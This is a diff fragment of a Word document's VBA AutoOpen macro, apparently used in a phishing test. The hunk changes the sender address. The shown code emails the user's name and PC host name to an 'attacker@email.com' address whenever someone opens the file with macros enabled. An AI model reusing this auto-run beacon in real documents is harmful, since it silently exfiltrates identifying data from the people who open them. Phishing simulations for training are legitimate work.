@@ -30,7 +30,7 @@ Public Sub AutoOpen()
     
     With objMessage
         .Subject = "Test Message"
-        .From = "phishingtest@uwtlogistics.com"
+          .From = "phishingtest@email.com"
         .To = "attacker@email.com; attacker@email.com"
         .HTMLBody = "user : " + GetUserName + "( " + GeUserName2 + " )" + " enabled Maros in Phishing Word Doc on PC : " + sHostName
     End With
